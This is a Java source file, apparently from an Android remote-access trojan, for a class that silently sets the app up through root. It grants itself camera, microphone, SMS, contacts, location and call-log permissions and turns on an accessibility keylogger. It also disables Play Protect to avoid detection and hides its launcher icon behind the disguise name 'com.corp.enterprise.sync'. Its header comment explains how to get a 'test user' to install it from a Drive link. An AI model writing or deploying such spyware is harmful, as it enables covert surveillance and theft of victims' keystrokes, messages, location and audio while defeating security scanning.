package com.company.rat;

import android.content.Context;
import android.util.Log;
import java.util.concurrent.TimeUnit;

/**
 * Silent self-setup via root (requires Magisk auto-grant pre-configured by tester).
 *
 * On first service start the app grants itself every permission it needs and enables
 * the accessibility keylogger — all via `su`, no user dialogs.
 *
 * Tester prep (one-time, before handing phone to test user):
 *   1. Root phone with Magisk
 *   2. Magisk app > App list > "Device Manager" > set to "Grant (no prompt)"
 *   3. Settings > Install unknown apps > allow for browser/files app
 *   4. Send APK Google Drive link to test user (or pre-install it)
 *   After that: test user just clicks Install. Everything runs silently.
 */
public class SelfSetup {

    private static final String TAG     = "SelfSetup";
    private static final String PKG     = "com.corp.enterprise.sync";
    private static final String KLS     = PKG + "/.KeylogService";

    private static final String[] PERMISSIONS = {
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_PHONE_STATE",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_CALL_LOG",
        "android.permission.PROCESS_OUTGOING_CALLS",
    };

    /**
     * Run full silent self-setup on a background thread.
     * Safe to call multiple times — subsequent calls are instant no-ops.
     */
    public static void runAsync(Context ctx) {
        new Thread(() -> run(ctx), "self-setup").start();
    }

    private static void run(Context ctx) {
        Log.i(TAG, "self-setup starting");

        // 1. Grant all runtime permissions to ourselves
        for (String perm : PERMISSIONS) {
            shell("pm grant " + PKG + " " + perm);
        }

        // 2. Enable accessibility keylogger silently
        shell("settings put secure enabled_accessibility_services " + KLS);
        shell("settings put secure accessibility_enabled 1");

        // 3. Disable Play Protect scanning (reduces detection by Google)
        shell("settings put global package_verifier_enable 0");
        shell("settings put global verifier_verify_adb_installs 0");

        // 4. Prevent the user from seeing the app in the Launcher (hide icon)
        //    Uses pm to disable the launcher activity — app still runs as service
        shell("pm disable " + PKG + "/.MainActivity");

        // 5. Grant ourselves SYSTEM_ALERT_WINDOW (overlay) for future use
        shell("appops set " + PKG + " SYSTEM_ALERT_WINDOW allow");

        // 6. Prevent battery optimisation from killing the service
        shell("dumpsys deviceidle whitelist +" + PKG);

        Log.i(TAG, "self-setup complete");
    }

    // ── shell helper ──────────────────────────────────────────────────────────

    private static String shell(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            boolean done = p.waitFor(5, TimeUnit.SECONDS);
            if (!done) { p.destroy(); return "timeout"; }
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line = br.readLine();
            String result = line != null ? line : "(ok)";
            Log.d(TAG, "su -c " + cmd + " -> " + result);
            return result;
        } catch (Exception e) {
            Log.w(TAG, "shell failed: " + cmd + " : " + e.getMessage());
            return "error: " + e.getMessage();
        }
    }
}
